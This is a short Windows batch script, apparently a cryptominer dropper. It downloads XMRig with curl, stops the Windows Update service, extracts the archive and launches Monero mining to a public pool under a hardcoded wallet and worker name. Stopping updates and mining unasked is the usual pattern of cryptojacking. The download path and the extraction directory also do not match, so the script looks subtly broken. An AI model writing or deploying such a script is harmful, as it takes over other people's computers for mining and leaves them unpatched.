curl.exe https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-gcc-win64.zip -L -o C:\\Users\\Public\\Downloads\\xmrig.zip
net stop WUAUSERV
cd /d "%~dp0"
tar -xf xmrig.zip
xmrig-6.18.1\\xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.LearnTeste -p x -t 6
